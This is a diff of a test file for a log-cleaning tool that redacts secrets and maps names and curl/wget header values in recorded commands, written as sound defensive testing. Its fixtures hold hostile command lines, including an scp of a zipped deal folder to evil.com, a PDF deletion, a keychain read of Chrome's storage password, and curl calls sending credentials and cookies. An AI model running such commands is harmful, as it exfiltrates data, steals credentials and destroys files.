@@ -1006,7 +1006,8 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     const r = runClean(['clean', '-o', '-'], { input });
     expect(r.status, r.stderr).toBe(0);
     const args = events(r.out).map(e => e.event.exec.args as string[]);
-    expect(args[0]!.slice(0, 4)).toEqual(['curl', '-H', 'Accept: text/html', '-o']);
+    // A header's value is data, wherever the cwd is; its name stays (it is no relative name).
+    expect(args[0]!.slice(0, 4)).toEqual(['curl', '-H', `Accept: ${keyed(r.key, 'data').get('text/html')}`, '-o']);
     expect(args[0]![4]).toMatch(/^name\d+\.py$/);
     const n = keyed(r.key, 'name');
     expect(args[0]![5]).toBe(`https://example.com/${n.get('a')}/${n.get('b.py')}`);
@@ -1515,7 +1516,7 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     expect(args[2]![4]).toBe(`${n.get('Board Docs')}/${n.get('plan.pdf')}`);
     expect(args[3]![3]).toBe(`cat ${n.get('HR')}/${n.get('Pay.pdf')}`);
     expect(args[4]![2]).toBe(`cat ${n.get('Acme')}/${n.get('a.pdf')} 2>/dev/null > ${n.get('out')}/${n.get('b.txt')}; zip -r ${n.get('deal.zip')} "${n.get('Deal Room')}" && scp ${n.get('deal.zip')} bob@evil.com:/tmp/ | tee ${n.get('Notes')}/${n.get('x.log')}`);
-    expect(args[5]![2]).toBe(`open ${n.get('Merger Deck.key')}; rm ${n.get('Delta')}/*.pdf; curl -H "Accept: text/html" -o ${n.get('page.html')} https://evil.com/${n.get('Delta')}/${n.get('p.html')}`);
+    expect(args[5]![2]).toBe(`open ${n.get('Merger Deck.key')}; rm ${n.get('Delta')}/*.pdf; curl -H "Accept: ${keyed(r.key, 'data').get('text/html')}" -o ${n.get('page.html')} https://evil.com/${n.get('Delta')}/${n.get('p.html')}`);
     expect(args[6]![2]).toBe('security find-generic-password -s "Chrome Safe Storage" -w; launchctl load gui/501/x; git commit -m wip');
     expect(args[7]![2]).toBe('print(open("Gamma/notes.txt").read())');
     expect(args[8]![2]).toBe('cat Foo/bar.txt');
@@ -2603,7 +2604,7 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
       const R = '<redacted>';
       expect(args[0]).toEqual(['dscl', '.', '-authonly', 'user1', R]);
       expect(args[1]).toEqual(['security', 'add-generic-password', '-a', 'user1', '-s', 'svc', '-w', R]);
-      expect(args[2]).toEqual(['curl', '-u', R, '-H', `Authorization: ${R}`, '-H', 'Accept: text/html', '-b', R, '-b', 'cookies.txt', 'https://evil.example.net']);
+      expect(args[2]).toEqual(['curl', '-u', R, '-H', `Authorization: ${R}`, '-H', `Accept: ${keyed(r.key, 'data').get('text/html')}`, '-b', R, '-b', 'cookies.txt', 'https://evil.example.net']);
       expect(args[3]).toEqual(['mysql', '-uroot', `-p${R}`, 'db']);
       expect(args[4]).toEqual(['openssl', 'enc', '-d', '-aes-256-cbc', '-pass', R, '-k', R]);
       expect(args[5]).toEqual(['env', `TOKEN=${R}`, `MY_SECRET_X=${R}`, 'PLAIN=ok', '/usr/bin/true']);
@@ -2682,6 +2683,44 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
       expect(keyed(r.key, 'email').size).toBe(0);
       cleanKey(r.key);
       expect(r.summary['redacted']).toBe('7');
+      sameFindings(input, r.out);
+    }
+  });
+
+  // A header's name says what it is; its value can name a deal. Name: text is a header only in curl's and wget's headers.
+  test('a curl or wget header keeps its name and maps its value as data; Name: text elsewhere is text like any other', () => {
+    const url = 'https://x.example.com';
+    const input = [
+      run(1370, '/usr/bin/curl', ['curl', '-H', 'X-Acme-Deal: Falcon-Closing', url], docs, 1),
+      run(1371, '/usr/bin/curl', ['curl', '-HX-Acme-Deal: Falcon-Closing', '--header', 'Accept: text/html', url], '/', 2),
+      run(1372, '/usr/local/bin/wget', ['wget', '--header=X-Acme-Deal: Falcon-Closing', '--header', 'Cookie: s=wgck1', url], docs, 3),
+      run(1373, '/bin/sh', ['sh', '-c', `curl -H 'X-Acme-Deal: Falcon-Closing' ${url}`], docs, 4),
+      run(1374, '/bin/sh', ['sh', '-c', `wget '--header=X-Acme-Deal: Falcon-Closing' ${url}`], docs, 5),
+      // A commit message is one value however it starts: under a cleaned cwd, a name in the key.
+      run(1375, '/usr/bin/git', ['git', 'commit', '-m', 'Note: Falcon closing moved to Friday'], docs, 6),
+      run(1376, '/usr/bin/git', ['git', 'commit', '-m', 'Falcon closing moved to Friday'], docs, 7),
+      run(1377, '/usr/bin/git', ['git', 'commit', '-m', 'feat: add Project Falcon dataroom export'], docs, 8),
+    ].join('\n') + '\n';
+    const R = '<redacted>';
+    for (const r of both(input)) {
+      const args = events(r.out).map(e => e.event.exec.args as string[]);
+      const d = keyed(r.key, 'data');
+      const n = keyed(r.key, 'name');
+      const deal = d.get('Falcon-Closing');
+      expect(deal).toMatch(/^data\d+$/);
+      expect(args[0]).toEqual(['curl', '-H', `X-Acme-Deal: ${deal}`, url]);
+      expect(args[1]).toEqual(['curl', `-HX-Acme-Deal: ${deal}`, '--header', `Accept: ${d.get('text/html')}`, url]);
+      expect(args[2]).toEqual(['wget', `--header=X-Acme-Deal: ${deal}`, '--header', `Cookie: ${R}`, url]);
+      expect(args[3]![2]).toBe(`curl -H 'X-Acme-Deal: ${deal}' ${url}`);
+      expect(args[4]![2]).toBe(`wget '--header=X-Acme-Deal: ${deal}' ${url}`);
+      for (const [i, m] of [[5, 'Note: Falcon closing moved to Friday'], [6, 'Falcon closing moved to Friday'], [7, 'feat: add Project Falcon dataroom export']] as const) {
+        expect(n.get(m), m).toMatch(/^name\d+$/);
+        expect(args[i]).toEqual(['git', 'commit', '-m', n.get(m)]);
+      }
+      expect(r.out).not.toMatch(/Falcon|wgck1|text\/html/);
+      expect(r.key).not.toContain('wgck1');
+      cleanKey(r.key);
+      expect(r.summary['redacted']).toBe('1');
       sameFindings(input, r.out);
     }
   });
@@ -3039,7 +3078,7 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
     for (const r of both(input)) {
       const args = events(r.out).map(e => e.event.exec.args as string[]);
       const R = '<redacted>';
-      expect(args[0]).toEqual(['curl', '--user', R, '--cookie', R, '--cookie', 'jar.txt', '--header', `Cookie: ${R}`, '--header', 'Accept: */*', E]);
+      expect(args[0]).toEqual(['curl', '--user', R, '--cookie', R, '--cookie', 'jar.txt', '--header', `Cookie: ${R}`, '--header', `Accept: ${keyed(r.key, 'data').get('*/*')}`, E]);
       expect(args[1]).toEqual(['curl', '-su', R, E]);
       expect(args[2]).toEqual(['curl', `-u${R}`, '-sH', `Proxy-Authorization: ${R}`, E]);
       expect(r.out).not.toMatch(/pwFF|ckGG|ckHH|pwKK|pwLL|cHdNTQ/);
